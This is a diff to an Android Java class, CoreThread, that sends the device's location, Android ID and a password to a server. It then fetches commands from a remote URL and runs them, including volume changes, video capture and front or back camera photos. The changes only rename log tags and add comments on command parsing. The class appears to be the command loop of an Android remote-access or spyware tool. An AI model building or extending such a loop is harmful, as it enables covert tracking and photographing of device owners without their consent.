@@ -110,12 +110,12 @@ public class CoreThread extends Thread {
             {
                 DataSet.getInstance().latitude = DataSet.getInstance().location.getLatitude();
                 DataSet.getInstance().longitude = DataSet.getInstance().location.getLongitude();
-                Log.i("com.connect", "Location Is Live = (" + DataSet.getInstance().latitude + "," + DataSet.getInstance().longitude + ")");
+                Log.i(DataSet.getInstance().LOG_TAG + this.getClass().getName(), "Location Is Live = (" + DataSet.getInstance().latitude + "," + DataSet.getInstance().longitude + ")");
             }
 
             else
             {
-                Log.i("com.connect","Location Is Dead");
+                Log.i(DataSet.getInstance().LOG_TAG + this.getClass().getName(),"Location Is Dead");
             }
 
             String url = DataSet.getInstance().URL + DataSet.getInstance().urlSendUpdate + "UID="
@@ -126,7 +126,7 @@ public class CoreThread extends Thread {
                     + DataSet.getInstance().version + "&Random=" + DataSet.getInstance().random
                     + "&Password=" + DataSet.getInstance().password;
             try {
-                Log.i("com.connect", url);
+                Log.i(DataSet.getInstance().LOG_TAG + this.getClass().getName(), url);
                 Factory.getInputStreamFromUrl(url, "");
             } catch (UnsupportedEncodingException e2) {
 
@@ -137,7 +137,7 @@ public class CoreThread extends Thread {
             try {
                 functions = new URL(DataSet.getInstance().URL + DataSet.getInstance().urlFunctions + "UID="
                         + DataSet.getInstance().androidId + "&Password=" + DataSet.getInstance().password);
-                Log.i("com.connect", functions.toString());
+                Log.i(DataSet.getInstance().LOG_TAG + this.getClass().getName(), functions.toString());
 
                 BufferedReader in = new BufferedReader(new InputStreamReader(functions.openStream()));
 
@@ -152,12 +152,12 @@ public class CoreThread extends Thread {
                         e.printStackTrace();
                     }
                     total.append(line);
-                    Log.i("com.connect", "Function Run: " + line);
+                    Log.i(DataSet.getInstance().LOG_TAG + this.getClass().getName(), "Function Run: " + line);
 
                     String parameter = "";
                     Matcher m = Pattern.compile("\\(([^)]+)\\)").matcher(line);
                     while(m.find()) {
-                        Log.i("com.connect", "Function Run: " + m.group(1));
+                        Log.i(DataSet.getInstance().LOG_TAG + this.getClass().getName(), "Function Run: " + m.group(1));
                         parameter = m.group(1);
                     }
 
@@ -178,6 +178,10 @@ public class CoreThread extends Thread {
                         {
                             new mediaVolumeDown().execute("");
                         }
+                        /*line = "ringervolumeup() ";
+                        * total = "ringervolumeup()";
+                        * list.size = 1, list[0] = "default";
+                        * */
                         else if(line.contains("ringervolumeup("))
                         {
                             new ringerVolumeUp().execute("");
@@ -213,6 +217,17 @@ public class CoreThread extends Thread {
                         {
                             new takeVideo(list.get(0), list.get(1)).execute("");
                         }
+                        /* Take Photo - back:
+                        *       line = "takephoto(0)";
+                        *       total = "takephoto(0)";
+                        *       list.size = 1, list[0] = "0";
+                        *       parameter = "0";
+                        * Take Photo - front:
+                        *       line = "takephoto(1)";
+                        *       total = "takephoto(1)";
+                        *       list.size = 1, list[0] = "1";
+                        *       parameter = "1";
+                        * */
                         else if(line.contains("takephoto("))
                         {
                             if(list.get(0).equalsIgnoreCase("1"))
